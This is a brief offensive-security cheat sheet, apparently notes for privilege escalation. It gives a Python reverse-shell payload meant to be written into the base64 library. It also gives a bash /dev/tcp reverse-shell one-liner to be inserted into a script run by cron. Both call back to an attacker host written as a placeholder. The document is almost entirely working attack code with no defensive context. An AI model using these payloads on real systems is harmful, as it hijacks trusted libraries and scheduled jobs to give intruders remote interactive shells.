- Edit python library base64

````python
#!/usr/bin/python3  
from os import dup2  
from subprocess import run  
import socket  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("LOCAL_IP",1234))   
dup2(s.fileno(),0)   
dup2(s.fileno(),1)   
dup2(s.fileno(),2)   
run(["/bin/bash","-i"])
````

- Edit an script running in a crontab:

```bash
bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
```


